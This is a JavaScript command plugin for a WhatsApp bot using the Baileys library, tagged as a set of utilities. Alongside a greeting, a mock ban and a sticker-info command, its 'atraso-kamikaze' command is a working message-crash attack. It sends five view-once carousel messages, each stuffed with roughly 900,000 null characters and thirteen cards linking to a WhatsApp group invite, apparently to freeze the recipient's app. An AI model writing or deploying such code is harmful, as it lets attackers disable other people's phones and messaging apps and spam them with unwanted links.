import { prepareWAMessageMedia, proto } from '@whiskeysockets/baileys';

let handler = async (m, { conn, text, command, args }) => {
  switch (command) {
    
    case 'hola':
      await conn.reply(m.chat, '👋 ¡Hola, esta es la case "hola" funcionando!', m);
      break;
    
    case 'ban':
      if (!args[0]) return m.reply('❌ Especifica un número para banear.');
      let user = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      await conn.reply(m.chat, `Usuario ${user} ha sido baneado (ejemplo).`, m);
      break;

    case 'atraso-kamikaze': {
    let travaSend = 5;
    let from = m.chat;
      for (let i = 0; i < travaSend; i++) {
          await conn.relayMessage(from, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'body': {
                    'text': '🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛' + "\0\0\0\0\0\0\0\0\0".repeat(0x1869f)
                  },
                  'carouselMessage': {
                    'cards': [{
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': './src/foto.jpg'
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE',
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': './src/foto.jpg'
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE',
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': 'cta_url',
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': 'cta_url',
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': "./src/foto.jpg"
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE',
                            'merchant_url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE"
                          })
                        }]
                      }
                    }, {
                      'header': proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({
                          'image': {
                            'url': './src/foto.jpg'
                          }
                        }, {
                          'upload': conn.waUploadToServer
                        })),
                        'title': "\nhttps://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE\n",
                        'gifPlayback': true,
                        'subtitle': " ",
                        'hasMediaAttachment': false
                      }),
                      'body': {
                        'text': "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
                      },
                      'nativeFlowMessage': {
                        'buttons': [{
                          'name': "cta_url",
                          'buttonParamsJson': JSON.stringify({
                            'display_text': '',
                            'url': "https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE",
                            'merchant_url': 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE'
                          })
                        }]
                      }
                    }]
                  }
                }
              }
            }
          }, {
            'participant': {
              'jid': from
            }
          });
        }
        break;
        }

    case 'stickerinfo':
      if (!m.quoted?.stickerMessage) return m.reply('❌ Responde a un sticker');
      let info = m.quoted.msg || m.quoted.fakeObj;
      await m.reply(JSON.stringify(info, null, 2));
      break;

    // puedes agregar más "cases" aquí

    default:
      await m.reply('❌ Comando no reconocido.');
  }
};

handler.command = ['hola', 'ban', 'atraso-kamikaze', 'stickerinfo']; // lista de comandos que este handler manejará
handler.tags = ['utilidades'];
handler.help = ['hola', 'ban <número>', 'atraso-kamikaze', 'stickerinfo'];

export default handler;